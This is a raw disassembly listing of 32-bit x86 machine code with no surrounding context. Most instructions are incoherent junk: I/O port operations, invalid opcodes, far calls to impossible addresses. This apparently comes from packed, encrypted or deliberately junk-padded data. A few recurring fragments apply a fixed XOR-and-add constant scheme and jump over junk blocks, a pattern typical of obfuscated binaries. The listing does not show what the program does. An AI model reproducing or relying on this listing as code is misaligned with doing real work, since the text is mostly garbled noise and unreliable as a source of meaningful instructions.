  407b9c:	scas   al,BYTE PTR es:[edi]
  407b9d:	mov    WORD PTR [ebp+0x46],gs
  407ba0:	(bad)  
  407ba1:	popf   
  407ba2:	ret    0x414
  407ba5:	(bad)  
  407ba6:	jae    0x407bcf
  407ba8:	sbb    al,0xe3
  407baa:	push   ecx
  407bab:	out    dx,al
  407bac:	popf   
  407bad:	cvtps2pd xmm2,QWORD PTR [ebp-0x731e1c51]
  407bb4:	out    dx,al
  407bb5:	mov    ch,0x5d
  407bb7:	push   ds
  407bb8:	ror    cl,0xf6
  407bbb:	inc    DWORD PTR [ecx-0x6f]
  407bbe:	mov    eax,ds:0x3dc07796
  407bc3:	rcr    DWORD PTR [ebp-0x31],cl
  407bc6:	sbb    eax,DWORD PTR [edx+0x4bd309fa]
  407bcc:	retf   
  407bcd:	stos   BYTE PTR es:[edi],al
  407bce:	in     al,dx
  407bcf:	ror    BYTE PTR [ebx+0x13],cl
  407bd2:	sbb    al,0x8d
  407bd4:	sti    
  407bd5:	and    edx,DWORD PTR [eax-0x691c44e1]
  407bdb:	mov    ds:0x9247a97e,eax
  407be0:	hlt    
  407be1:	and    BYTE PTR [ebx],0x28
  407be4:	fadd   DWORD PTR [edi]
  407be6:	pop    es
  407be7:	cmp    eax,0xcfa0062d
  407bec:	pop    esi
  407bed:	xchg   edi,eax
  407bee:	std    
  407bef:	ret    
  407bf0:	jns    0x407b8c
  407bf2:	sbb    DWORD PTR [ebx-0xdefaf44],ebp
  407bf8:	test   BYTE PTR [ebx+0x5f],0x89
  407bfc:	jl     0x407bcb
  407bfe:	ds sbb eax,0x6fdd2cfb
  407c04:	xchg   edx,eax
  407c05:	lods   eax,DWORD PTR ds:[esi]
  407c06:	xor    BYTE PTR [ecx+0x6c7d1807],bh
  407c0c:	sbb    DWORD PTR [eax],esp
  407c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c0f:	or     DWORD PTR [eax+esi*1+0x1aca9890],eax
  407c16:	and    eax,0xe4c1c321
  407c1b:	leave  
  407c1c:	stos   BYTE PTR es:[edi],al
  407c1d:	into   
  407c1e:	lea    ebx,[edx+0x66f2a1f1]
  407c24:	mov    eax,0x9d2df347
  407c29:	push   cs
  407c2a:	cmp    ebp,ecx
  407c2c:	mov    edx,0x319598ce
  407c31:	mov    eax,ds:0xa0dc4b56
  407c36:	push   ecx
  407c37:	pusha  
  407c38:	adc    BYTE PTR ds:0xe88c3f7e,cl
  407c3e:	add    eax,0x95f26c28
  407c43:	mov    eax,DWORD PTR [ebp-0x1c]
  407c46:	imul   eax,ecx
  407c49:	sub    esp,eax
  407c4b:	mov    DWORD PTR [ebp-0x24],esp
  407c4e:	jmp    0x407dd7
  407c53:	dec    esi
  407c54:	cli    
  407c55:	sbb    al,0xe
  407c57:	test   al,0xda
  407c59:	outs   dx,BYTE PTR ds:[esi]
  407c5a:	jp     0x407c98
  407c5c:	out    0x6d,eax
  407c5e:	shr    dh,1
  407c60:	daa    
  407c61:	mov    bl,dh
  407c63:	xor    esp,DWORD PTR [esi]
  407c65:	jl     0x407ce3
  407c67:	call   0x2cbcf8eb
  407c6c:	mov    ah,0x72
  407c6e:	sbb    al,0xb2
  407c70:	and    DWORD PTR [esi+0x4f],ecx
  407c73:	(bad)  
  407c74:	rcl    DWORD PTR [ecx-0x3f],cl
  407c77:	push   0x562d183
  407c7c:	xlat   BYTE PTR ds:[ebx]
  407c7d:	clc    
  407c7e:	mov    eax,0x2b161a74
  407c83:	xor    eax,0xcaf14943
  407c88:	xor    ecx,edx
  407c8a:	imul   esp,DWORD PTR [ebx+edi*2],0x1f
  407c8e:	xchg   edi,eax
  407c8f:	sbb    esp,DWORD PTR [ebp+0x2e]
  407c92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c93:	mov    bh,0x34
  407c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c96:	dec    edx
  407c97:	pop    ebp
  407c98:	sub    al,0xe8
  407c9a:	cmp    DWORD PTR ss:[edi+0x1daf409],0xa
  407ca2:	test   eax,0xda2b6c3a
  407ca7:	aas    
  407ca8:	stc    
  407ca9:	loop   0x407c5b
  407cab:	sahf   
  407cac:	push   esi
  407cad:	sub    ch,ch
  407caf:	outs   dx,BYTE PTR ds:[esi]
  407cb0:	imul   eax,DWORD PTR [eax],0xffffffaf
  407cb3:	xchg   DWORD PTR ds:0xd2fcb363,edi
  407cb9:	bound  esp,QWORD PTR [edi+0x4f]
  407cbc:	pop    edi
  407cbd:	xor    eax,0xb44f6bb5
  407cc2:	push   ecx
  407cc3:	ja     0x407cdf
  407cc5:	xor    BYTE PTR [edi+ebp*4-0x6e],0x7f
  407cca:	xor    DWORD PTR [eax-0x34fded6a],esi
  407cd0:	adc    bh,BYTE PTR [ecx-0x11]
  407cd3:	add    esi,DWORD PTR [eax-0x190c6f0]
  407cd9:	or     DWORD PTR [esi],0x28
  407cdc:	out    dx,eax
  407cdd:	scas   eax,DWORD PTR es:[edi]
  407cde:	or     eax,0xaeb07c8
  407ce3:	jl     0x407c7b
  407ce5:	inc    edx
  407ce6:	push   esi
  407ce7:	inc    edx
  407ce8:	addr16 jle 0x407c9d
  407ceb:	jmp    0xbabc0872
  407cf0:	stc    
  407cf1:	mov    edi,0xbcc9018a
  407cf6:	dec    esi
  407cf7:	fs inc esi
  407cf9:	daa    
  407cfa:	push   ebx
  407cfb:	leave  
  407cfc:	cmp    ch,BYTE PTR [ebp-0x6b]
  407cff:	inc    ebx
  407d00:	std    
  407d01:	rcl    ebx,0x9f
  407d04:	lahf   
  407d05:	sbb    BYTE PTR [edx],bl
  407d07:	enter  0xcce9,0x64
  407d0b:	dec    esi
  407d0c:	xchg   esp,eax
  407d0d:	ror    DWORD PTR [esi+0x52d37cc9],0x1
  407d14:	or     bh,BYTE PTR [edi-0x3c]
  407d17:	call   0x3dd9:0x63cbd844
  407d1e:	outs   dx,BYTE PTR ds:[esi]
  407d1f:	xor    eax,DWORD PTR [ebx-0x38]
  407d22:	outs   dx,DWORD PTR ds:[esi]
  407d23:	or     DWORD PTR [ecx],ecx
  407d25:	sub    al,0x4d
  407d27:	lock mov ds:0x6e0a5f4a,al
  407d2d:	and    DWORD PTR [eax],esi
  407d2f:	pusha  
  407d30:	push   ebp
  407d31:	jne    0x407d40
  407d33:	cld    
  407d34:	mov    bl,0x51
  407d36:	xor    DWORD PTR [esi+eax*8-0x1e],esi
  407d3a:	ror    BYTE PTR [ecx],1
  407d3c:	mov    cl,0x7e
  407d3e:	push   ss
  407d3f:	xor    BYTE PTR [edx-0xa1396cf],0x30
  407d46:	ret    0x15d6
  407d49:	dec    eax
  407d4a:	push   ebp
  407d4b:	imul   edi,edx,0xbcbd6d57
  407d51:	pop    esi
  407d52:	in     al,dx
  407d53:	fwait
  407d54:	add    edx,DWORD PTR cs:[esi-0x31]
  407d58:	test   al,0xb5
  407d5a:	and    eax,0x255d189b
  407d5f:	pop    edx
  407d60:	jae    0x407d67
  407d62:	cmp    esp,DWORD PTR [ebp-0x7]
  407d65:	sbb    al,0xea
  407d67:	mov    esp,fs
  407d69:	add    ecx,edi
  407d6b:	sub    al,0x69
  407d6d:	neg    BYTE PTR [ecx]
  407d6f:	cdq    
  407d70:	mov    bh,0x7
  407d72:	xor    dl,BYTE PTR [eax+0x20]
  407d75:	xchg   BYTE PTR [ebx-0x6d84d44d],dh
  407d7b:	dec    esp
  407d7c:	cdq    
  407d7d:	daa    
  407d7e:	xlat   BYTE PTR ds:[ebx]
  407d7f:	dec    esi
  407d80:	or     al,0x3d
  407d82:	push   ebx
  407d83:	xor    eax,0x22322373
  407d88:	ja     0x407e04
  407d8a:	scas   al,BYTE PTR es:[edi]
  407d8b:	rcr    BYTE PTR [eax-0x72c3209d],cl
  407d91:	inc    ebx
  407d92:	ror    BYTE PTR [edx],cl
  407d94:	bound  eax,QWORD PTR [esi+0x595d84bc]
  407d9a:	stos   DWORD PTR es:[edi],eax
  407d9b:	adc    eax,0xa05c5983
  407da0:	push   edx
  407da1:	fwait
  407da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da3:	es (bad) 
  407da7:	push   esi
  407da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407da9:	xchg   DWORD PTR [ebp+0x15b7c6ca],edx
  407daf:	mov    bh,0xae
  407db1:	sub    ah,ah
  407db3:	test   al,0x64
  407db5:	or     ebx,0xffffff80
  407db8:	pop    ebx
  407db9:	adc    BYTE PTR [edi-0x71fd5218],al
  407dbf:	lds    edi,FWORD PTR [ecx]
  407dc1:	ret    0xa30c
  407dc4:	sbb    DWORD PTR [ebp-0x2e04e6b],0x1ff715b1
  407dce:	imul   ecx,DWORD PTR [edi],0xb8730847
  407dd4:	cs ja  0x407e2c
  407dd7:	mov    eax,DWORD PTR [ebp-0x4]
  407dda:	mov    ecx,0x7510857
  407ddf:	xor    eax,ecx
  407de1:	mov    edx,0x32729e
  407de6:	add    eax,edx
  407de8:	jmp    0x407f71
  407ded:	push   0xffffffd5
  407def:	mov    ebp,0x7d64bd94
  407df4:	aad    0x16
  407df6:	sbb    bl,BYTE PTR [esi+0x5a0c458e]
  407dfc:	sbb    al,0xaf
  407dfe:	cmp    DWORD PTR [esp+edi*2-0x18],edi
  407e02:	jg     0x407e80
  407e04:	jl     0x407da5
  407e06:	test   DWORD PTR [edx+ebx*8+0x7b],ebx
  407e0a:	adc    al,0x87
  407e0c:	rcr    BYTE PTR [ebx-0x37e26b8e],0xe5
  407e13:	leave  
  407e14:	cmp    BYTE PTR [ebp-0x63213d38],bh
  407e1a:	xchg   ebx,eax
  407e1b:	out    dx,al
  407e1c:	sub    DWORD PTR [ecx-0x78],ecx
  407e1f:	xchg   edx,eax
  407e20:	mov    BYTE PTR [esi],al
  407e22:	bound  esp,QWORD PTR gs:[ebp-0x57161b53]
  407e29:	jnp    0x407e0b
  407e2b:	dec    ebp
  407e2c:	(bad)  
  407e2d:	loope  0x407e0d
  407e2f:	jns    0x407e53
  407e31:	push   esp
  407e32:	lock add edi,DWORD PTR [eax]
  407e35:	add    al,0x30
  407e37:	pop    es
  407e38:	pop    ebp
  407e39:	mov    esp,ebp
  407e3b:	mov    bh,0xb5
  407e3d:	lods   eax,DWORD PTR ds:[esi]
  407e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e3f:	pop    ebp
  407e40:	leave  
  407e41:	mov    dh,0xdd
  407e43:	add    eax,DWORD PTR [eax+0x7a]
  407e46:	gs mov bh,0x8b
  407e49:	rcr    BYTE PTR [ebp-0x40],0x56
  407e4d:	jecxz  0x407e32
  407e4f:	and    esp,ebp
  407e51:	scas   eax,DWORD PTR es:[edi]
  407e52:	fsubr  st,st(3)
  407e54:	jnp    0x407ec7
  407e56:	push   ss
  407e57:	popf   
  407e58:	or     al,0x18
  407e5a:	push   ecx
  407e5b:	jmp    0x407ea4
  407e5d:	mov    esp,0xf00c6c1d
  407e62:	repnz into 
  407e64:	sub    ebp,DWORD PTR [edi]
  407e66:	in     eax,0xc5
  407e68:	pop    ebp
  407e69:	pop    esi
  407e6a:	test   eax,0x97090465
  407e6f:	stc    
  407e70:	shr    DWORD PTR [edx+0x65f69416],0xa4
  407e77:	mov    ebp,0x2fcca009
  407e7c:	nop
  407e7d:	out    dx,al
  407e7e:	push   edx
  407e7f:	imul   edx,ebx,0x3889366
  407e85:	push   edx
  407e86:	adc    esp,DWORD PTR [edi+edi*2+0x7350babd]
  407e8d:	ror    esi,1
  407e8f:	mov    edx,DWORD PTR [eax]
  407e91:	in     al,0x8
  407e93:	cdq    
  407e94:	fist   WORD PTR [edi+0x27]
  407e97:	sub    BYTE PTR [esi+ecx*2+0x66],dh
  407e9b:	iret   
  407e9c:	sub    bh,BYTE PTR [eax+0x6d268e92]
  407ea2:	inc    edx
  407ea3:	retf   
  407ea4:	gs or  ebx,ecx
  407ea7:	jg     0x407e4c
  407ea9:	xchg   dl,al
  407eab:	xchg   ecx,eax
  407eac:	xchg   esp,eax
  407ead:	in     al,0xfb
  407eaf:	arpl   WORD PTR [eax],si
  407eb1:	mov    ch,BYTE PTR [edi-0xf]
  407eb4:	nop
  407eb5:	adc    DWORD PTR [ebp-0x4d1f67c9],edi
  407ebb:	or     al,0x31
  407ebd:	adc    edi,DWORD PTR [ebp+0x6b630e4d]
  407ec3:	pushf  
  407ec4:	call   0x96eafc76
  407ec9:	jae    0x407f1b
  407ecb:	and    bl,BYTE PTR [eax]
  407ecd:	in     eax,0xa
  407ecf:	adc    al,0x51
  407ed1:	sbb    al,0x90
  407ed3:	ins    DWORD PTR es:[edi],dx
  407ed4:	daa    
  407ed5:	mov    ecx,0xafefcf6a
  407eda:	outs   dx,BYTE PTR ds:[esi]
  407edb:	in     eax,dx
  407edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407edd:	repnz sbb al,0x9a
  407ee0:	addr16 int3 
  407ee2:	adc    edx,edi
  407ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee5:	inc    eax
  407ee6:	fild   WORD PTR [ecx+0x5e]
  407ee9:	frstor [ecx+0xe5e9f58]
  407eef:	add    eax,0xc35c0405
  407ef4:	stos   DWORD PTR es:[edi],eax
  407ef5:	repz adc eax,0x3412a47c
  407efb:	cwde   
  407efc:	push   ds
  407efd:	sbb    BYTE PTR [ecx-0x56],0x8a
  407f01:	loop   0x407f16
  407f03:	push   ebp
  407f04:	frstor ds:0x807e2874
  407f0a:	leave  
  407f0b:	add    edi,DWORD PTR ds:0xb74ade
  407f11:	pop    ss
  407f12:	cmp    DWORD PTR [esi-0x3a],0x670e3454
  407f19:	js     0x407ec0
  407f1b:	push   ds
  407f1c:	jno    0x407f1a
  407f1e:	int3   
  407f1f:	dec    eax
  407f20:	mov    ds:0x599d3447,al
  407f25:	add    edx,eax
  407f27:	daa    
  407f28:	dec    esp
  407f29:	mov    ch,0x97
  407f2b:	adc    edi,DWORD PTR [edi-0x6ca06788]
  407f31:	xlat   BYTE PTR ds:[ebx]
  407f32:	repnz inc esp
  407f34:	(bad)  [edi-0x6a]
  407f37:	adc    BYTE PTR [edx],cl
  407f39:	std    
  407f3a:	call   0x8f1b7d5f
  407f3f:	jmp    0xe80f:0xab6a7162
  407f46:	dec    edx
  407f47:	push   ebp
  407f48:	sub    ch,BYTE PTR [ecx+0x5c9032d6]
  407f4e:	mov    edx,0x87ad4103
  407f53:	pushf  
  407f54:	enter  0x5aec,0x97
  407f58:	dec    ebx
  407f59:	ins    DWORD PTR es:[edi],dx
  407f5a:	rcl    BYTE PTR [edx],cl
  407f5c:	jnp    0x407fa8
  407f5e:	mov    al,0x30
  407f60:	add    eax,0xe1a9ad23
  407f65:	loopne 0x407f48
  407f67:	pop    esi
  407f68:	fucomip st,st(4)
  407f6a:	loopne 0x407fd4
  407f6c:	mov    bh,0x35
  407f6e:	dec    ecx
  407f6f:	pop    ss
  407f70:	mov    ebp,0x8b084589
  407f75:	inc    ebp
  407f76:	call   0xc24440ae
  407f7b:	mov    edx,DWORD PTR [ebp+0x14]
  407f7e:	imul   eax,DWORD PTR [edx]
  407f81:	mov    edx,DWORD PTR [ebp-0x4]
  407f84:	xor    edx,ecx
  407f86:	mov    ecx,DWORD PTR [ebp+0x8]
  407f89:	lea    ecx,[edx+ecx*1+0x32729e]
  407f90:	cmp    ecx,eax
  407f92:	je     0x4087b6
  407f98:	mov    edi,DWORD PTR [ebp-0x18]
  407f9b:	mov    eax,DWORD PTR [ebp+0x8]
  407f9e:	mov    edx,DWORD PTR [ebp+0x14]
  407fa1:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  407fa5:	mov    ecx,0x7510857
  407faa:	xor    edx,edx
  407fac:	xor    edi,ecx
  407fae:	mov    esi,0x32729e
  407fb3:	add    edi,esi
  407fb5:	jmp    0x40813e
  407fba:	je     0x40800f
  407fbc:	jne    0x407fa1
  407fbe:	ins    DWORD PTR es:[edi],dx
  407fbf:	gs out 0x7b,al
  407fc2:	aam    0xcc
  407fc4:	pop    es
  407fc5:	addr16 nop
  407fc7:	mov    ebx,0x3b1b093b
  407fcc:	jl     0x40804a
  407fce:	call   0x8bbcfc52
  407fd3:	xchg   DWORD PTR [eax],esp
  407fd5:	repz lahf 
  407fd7:	mov    WORD PTR [edi],cs
  407fd9:	je     0x407f7a
  407fdb:	or     BYTE PTR [edx+0xc29eb07],dl
  407fe1:	hlt    
  407fe2:	and    al,0xdf
  407fe4:	in     al,dx
  407fe5:	jo     0x407f8c
  407fe7:	call   0xe028:0x801b4e5c
  407fee:	out    dx,al
  407fef:	shl    al,cl
  407ff1:	dec    edi
  407ff2:	int3   
  407ff3:	push   0xffffffe0
  407ff5:	retf   
  407ff6:	(bad)  
  407ff7:	sub    eax,0x2b1821c3
  407ffc:	push   es
  407ffd:	mov    ds:0x92ce18a3,al
  408002:	xor    dl,BYTE PTR [edx+0x58]
  408005:	pop    esi
  408006:	cmp    al,0xf1
  408008:	fs stc 
  40800a:	(bad)  
  40800b:	push   0x73
  40800d:	mov    al,ds:0x15375652
  408012:	jb     0x407ff7
  408014:	repnz push esi
  408016:	pop    ebp
  408017:	mov    eax,0x6c67d8ff
  40801c:	mov    eax,ds:0x283394fe
  408021:	fwait
  408022:	xor    DWORD PTR [edi+0x1b681e6b],ecx
  408028:	push   eax
  408029:	mov    esp,0x9db38be0
  40802e:	clc    
  40802f:	aas    
  408030:	pop    eax
  408031:	jnp    0x4080a7
  408033:	add    DWORD PTR [edx+0x30],esi
  408036:	sbb    DWORD PTR [ebp+0x76b488c8],eax
  40803c:	out    dx,al
  40803d:	sub    BYTE PTR [bx+di+0x1a],0xa7
  408042:	xchg   DWORD PTR [ebp+edx*8-0x5a],esp
  408046:	scas   al,BYTE PTR es:[edi]
  408047:	inc    BYTE PTR [edx]
  408049:	sub    BYTE PTR [ecx-0x6882dbaf],ah
  40804f:	test   bh,0x9a
  408052:	leave  
  408053:	or     cl,BYTE PTR [esi-0x71]
  408056:	rcr    DWORD PTR [edx+eiz*4],0xca
  40805a:	mov    eax,0x76fc2659
  40805f:	add    bh,BYTE PTR [ebx]
  408061:	fst    DWORD PTR [eax]
  408063:	pop    edi
  408064:	inc    eax
  408065:	es ss scas al,BYTE PTR es:[edi]
  408068:	popa   
  408069:	mov    dl,0x2c
  40806b:	adc    cl,BYTE PTR [eax+0x2b]
  40806e:	leave  
  40806f:	mov    eax,0x5fbf7d15
  408074:	or     eax,0xab0b70ef
  408079:	push   eax
  40807a:	jnp    0x408061
  40807c:	push   ecx
  40807d:	test   ch,cl
  40807f:	or     DWORD PTR [edi],eax
  408081:	je     0x4080d2
  408083:	and    edx,eax
  408085:	retf   0xa81a
  408088:	push   ds
  408089:	mov    al,0x11
  40808b:	mov    al,ds:0x2edb500a
  408090:	jle    0x408073
  408092:	jne    0x4080a7
  408094:	repz bound ebp,QWORD PTR [edi]
  408097:	mov    al,0xbd
  408099:	mov    cl,0xed
  40809b:	xchg   ebp,eax
  40809c:	cmp    DWORD PTR [edi],esp
  40809e:	sbb    al,0x1d
  4080a0:	mov    dh,0x1e
  4080a2:	mov    al,ds:0xc05b9a93
  4080a7:	xchg   edx,eax
  4080a8:	push   ebx
  4080a9:	sahf   
  4080aa:	and    ah,BYTE PTR [edx]
  4080ac:	outs   dx,BYTE PTR ds:[esi]
  4080ad:	dec    eax
  4080ae:	push   es
  4080af:	rol    bl,0x7b
  4080b2:	jo     0x408107
  4080b4:	fwait
  4080b5:	adc    al,0xf5
  4080b7:	and    eax,DWORD PTR [edx+edi*2]
  4080ba:	into   
  4080bb:	adc    edx,edi
  4080bd:	sbb    al,0x7d
  4080bf:	jns    0x4080c0
  4080c1:	test   DWORD PTR [eax+0x6cd1485],ebp
  4080c7:	fstp   QWORD PTR [eax+0x46f98e79]
  4080cd:	or     DWORD PTR [ebx],eax
  4080cf:	ins    DWORD PTR es:[edi],dx
  4080d0:	lods   eax,DWORD PTR ds:[esi]
  4080d1:	test   al,0x8b
  4080d3:	xchg   ecx,eax
  4080d4:	sbb    al,BYTE PTR [ecx]
  4080d6:	js     0x40806a
  4080d8:	xor    dl,BYTE PTR [esi]
  4080da:	cmp    edi,edi
  4080dc:	lds    esi,FWORD PTR [esi]
  4080de:	rcl    BYTE PTR [ecx-0x748b8f19],cl
  4080e4:	inc    edi
  4080e5:	xor    al,0x86
  4080e7:	mov    esi,0xa5c40575
  4080ec:	and    DWORD PTR [edi-0x47bb8261],ebp
  4080f2:	lahf   
  4080f3:	xchg   ecx,eax
  4080f4:	mov    al,0xab
  4080f6:	jae    0x40809c
  4080f8:	sbb    eax,0xfc77f07c
  4080fd:	test   al,0x39
  4080ff:	fiadd  WORD PTR ds:0x7942dc2c
  408105:	dec    eax
  408106:	sbb    DWORD PTR [eax+eiz*8-0x6d900c13],esp
  40810d:	push   es
  40810e:	mov    edx,0xf88bbf0c
  408113:	outs   dx,DWORD PTR ds:[esi]
  408114:	clc    
  408115:	data16 cmp al,0x61
  408118:	jg     0x40818a
  40811a:	sub    ebx,ecx
  40811c:	mov    cl,0x2b
  40811e:	pop    ds
  40811f:	ret    
  408120:	mov    eax,edx
  408122:	sbb    DWORD PTR [edx],edi
  408124:	push   esp
  408125:	sub    al,0x63
  408127:	stos   DWORD PTR es:[edi],eax
  408128:	mov    bh,0x27
  40812a:	xor    cl,dl
  40812c:	(bad)  
  40812d:	call   DWORD PTR [ebp+0x34]
  408130:	push   ebp
  408131:	mov    ecx,0x16511b8d
  408136:	inc    ecx
  408137:	repz dec ebx
  408139:	scas   eax,DWORD PTR es:[edi]
  40813a:	pop    eax
  40813b:	rcr    DWORD PTR [ebp+ebp*8+0x558bf7f7],0xfc
  408143:	xor    edx,ecx
  408145:	lea    eax,[edx+eax*1+0x32729e]
  40814c:	mov    edx,DWORD PTR [ebp+0x8]
  40814f:	mov    edi,DWORD PTR [ebp-0x24]
  408152:	mov    DWORD PTR [edi+edx*4],eax
  408155:	mov    eax,DWORD PTR [ebp-0x18]
  408158:	mov    edx,DWORD PTR [ebp+0x8]
  40815b:	xor    eax,ecx
  40815d:	lea    eax,[eax+edx*1+0x32729e]
  408164:	mov    DWORD PTR [ebp+0x8],eax
  408167:	mov    eax,DWORD PTR [ebp-0x18]
  40816a:	jmp    0x4082f3
  40816f:	sahf   
  408170:	mov    eax,0x7dfa3de4
  408175:	push   ebp
  408176:	mov    ebx,0x5d2a391f
  40817b:	add    al,0x3e
  40817d:	ret    
  40817e:	adc    edi,esi
  408180:	cmp    bh,BYTE PTR [esp+edi*2-0x18]
  408184:	jg     0x408202
  408186:	jl     0x4081d4
  408188:	mov    edi,0xc4623322
  40818d:	mov    al,0x6d
  40818f:	ss shl dl,1
  408192:	ret    0x318
  408195:	mov    eax,ds:0x24113c3d
  40819a:	out    dx,al
  40819b:	sbb    bl,BYTE PTR [esi+eax*1]
  40819e:	cli    
  40819f:	fisttp DWORD PTR [esi+0xbc30750]
  4081a5:	sahf   
  4081a6:	jp     0x408146
  4081a8:	adc    dl,BYTE PTR [ebp-0x7a]
  4081ab:	repz pop edi
  4081ad:	dec    eax
  4081ae:	ret    
  4081af:	mov    edi,ebx
  4081b1:	add    BYTE PTR [edi+ecx*2+0xe0b6b60],al
  4081b8:	mov    ?,esi
  4081ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081bb:	jbe    0x40821e
  4081bd:	retf   0xc722
  4081c0:	imul   esp,DWORD PTR [eax],0xf260fd9d
  4081c6:	aaa    
  4081c7:	xchg   BYTE PTR [edx-0x72],ch
  4081ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081cb:	call   FWORD PTR [eax+esi*2]
  4081ce:	sbb    BYTE PTR [edx-0x335fa7d],dl
  4081d4:	out    dx,eax
  4081d5:	pop    ebp
  4081d6:	and    bh,BYTE PTR [edi]
  4081d8:	push   esp
  4081d9:	jecxz  0x408221
  4081db:	mov    ebp,0xba2974b8
  4081e0:	call   FWORD PTR [ecx]
  4081e2:	call   0xe8027bad
  4081e7:	jmp    0x43323617
  4081ec:	stc    
  4081ed:	adc    DWORD PTR [ecx],0x4896e12c
  4081f3:	pop    ebp
  4081f4:	jmp    DWORD PTR [ecx+edx*4+0x39]
  4081f8:	inc    ecx
  4081f9:	mov    BYTE PTR [edx],cl
  4081fb:	pop    ebp
  4081fc:	or     al,al
  4081fe:	xchg   edi,eax
  4081ff:	xchg   edi,eax
  408200:	mov    bh,0x32
  408202:	pop    ebx
  408203:	adc    al,0x37
  408205:	bound  eax,QWORD PTR [edx+ebx*2+0x7b]
  408209:	fcmovne st,st(2)
  40820b:	mov    bh,0x29
  40820d:	ds pop esi
  40820f:	xor    dl,BYTE PTR [ecx]
  408211:	inc    ecx
  408212:	inc    edi
  408213:	ffree  st(4)
  408215:	fist   WORD PTR [ecx-0x17]
  408218:	push   cs
  408219:	popa   
  40821a:	push   eax
  40821b:	inc    ebx
  40821c:	or     DWORD PTR [edx-0x72],ebp
  40821f:	ss mov esi,cs
  408222:	jns    0x408280
  408224:	jno    0x408244
  408226:	aam    0xea
  408228:	das    
  408229:	push   eax
  40822a:	aam    0xc
  40822c:	jne    0x4081f6
  40822e:	int    0x4b
  408230:	and    DWORD PTR ds:0x8f76,esi
  408235:	sahf   
  408236:	test   eax,0xf2278cc7
  40823b:	and    eax,0xb3107b96
  408240:	js     0x408205
  408242:	pop    eax
  408243:	test   BYTE PTR [edi],bh
  408245:	adc    ah,ah
  408247:	mov    esi,edx
  408249:	dec    ebp
  40824a:	scas   al,BYTE PTR es:[edi]
  40824b:	push   ds
  40824c:	fst    DWORD PTR [esi]
  40824e:	test   eax,0x19db54a6
  408253:	popf   
  408254:	or     ebx,DWORD PTR [ecx]
  408256:	add    BYTE PTR [esi+esi*4-0x48becfd4],ah
  40825d:	(bad)  
  40825e:	aam    0xcb
  408260:	or     DWORD PTR [edx],0xfffffff0
  408263:	inc    esp
  408264:	adc    DWORD PTR [edi+eax*4-0x70],ebx
  408268:	mov    edx,0xd2a02f0d
  40826d:	add    ah,bl
  40826f:	cs push ss
  408271:	test   dl,cl
  408273:	aaa    
  408274:	push   ebx
  408275:	push   esp
  408276:	mov    eax,ds:0x590f1e42
  40827b:	popa   
  40827c:	mov    edi,0x35908d9c
  408281:	mov    esp,0xdf04bd5e
  408286:	or     ebp,DWORD PTR [ebp+0x1cf8e830]
  40828c:	or     ecx,DWORD PTR [edi+0x28]
  40828f:	test   DWORD PTR [esi],esi
  408291:	das    
  408292:	popf   
  408293:	dec    ebp
  408294:	xchg   esi,eax
  408295:	mov    ah,0x7e
  408297:	add    eax,0x3df7a75b
  40829c:	aad    0x4b
  40829e:	sahf   
  40829f:	sub    ecx,ebp
  4082a1:	sub    dl,BYTE PTR ds:0xc2d0bf95
  4082a7:	add    dl,dl
  4082a9:	push   edx
  4082aa:	pop    ss
  4082ab:	scas   eax,DWORD PTR es:[edi]
  4082ac:	mov    ah,0xf9
  4082ae:	sbb    dl,BYTE PTR ds:0x94c49ce5
  4082b4:	add    eax,0x16e5250b
  4082b9:	fs jmp 0x6ae03c10
  4082bf:	mov    esi,0x5e67b13
  4082c4:	jp     0x408307
  4082c6:	mov    eax,ds:0x9e7160c
  4082cb:	enter  0x860d,0x36
  4082cf:	jbe    0x408312
  4082d1:	int3   
  4082d2:	sti    
  4082d3:	add    ecx,edx
  4082d5:	mov    dl,0xc2
  4082d7:	ss sub ecx,esp
  4082da:	stos   DWORD PTR es:[edi],eax
  4082db:	les    edx,FWORD PTR [ecx-0x6b3b297b]
  4082e1:	rcr    DWORD PTR [ebp+0x29666641],1
  4082e7:	inc    edi
  4082e8:	fist   WORD PTR [ebx]
  4082ea:	sub    DWORD PTR [eax],ebp
  4082ec:	mov    ds:0x365093bb,eax
  4082f1:	in     eax,0xaf
  4082f3:	mov    edx,DWORD PTR [ebp+0x14]
  4082f6:	jmp    0x40847f
  4082fb:	ret    0xc507
  4082fe:	out    0xdd,eax
  408300:	std    
  408301:	cli    
  408302:	cmp    eax,0xbb29729
  408307:	mov    bl,0x47
  408309:	inc    ecx
  40830a:	ja     0x40836f
  40830c:	cmp    eax,0x7fe87c7c
  408311:	jl     0x40838f
  408313:	push   esp
  408314:	mov    eax,0xab51075c
  408319:	loopne 0x408312
  40831b:	pop    esp
  40831c:	fwait
  40831d:	pop    ebx
  40831e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40831f:	ja     0x4082c6
  408321:	add    eax,0x35f0a4d4
  408326:	bound  esp,QWORD PTR [ebp+0x12]
  408329:	sub    al,0xd
  40832b:	stos   DWORD PTR es:[edi],eax
  40832c:	sti    
  40832d:	cmp    al,BYTE PTR [ecx]
  40832f:	bound  esi,QWORD PTR [edi+ebx*4-0x7c0acaf6]
  408336:	out    dx,al
  408337:	lahf   
  408338:	or     BYTE PTR [ebp+ecx*4-0x5b1d3458],cl
  40833f:	xchg   ebx,esi
  408341:	inc    ebp
  408342:	adc    cl,BYTE PTR [edi+0x50e4d366]
  408348:	shrd   DWORD PTR [ebp-0x2f76a781],ecx,0xc2
  408350:	loopne 0x4082f2
  408352:	popa   
  408353:	mov    ebp,0x15671d62
  408358:	cmp    DWORD PTR [ebx*8-0xd3e7145],ebx
  40835f:	cli    
  408360:	out    dx,eax
  408361:	repz hlt 
  408363:	and    BYTE PTR [edi+0x68b99273],bh
  408369:	gs mov ch,0x5f
  40836c:	mov    bh,0x67
  40836e:	(bad)  
  40836f:	mov    dl,al
  408371:	fsub   st,st(7)
  408373:	xchg   edx,edi
  408375:	mov    fs,WORD PTR [edi-0x69947df1]
  40837b:	fisub  WORD PTR [eax-0x14]
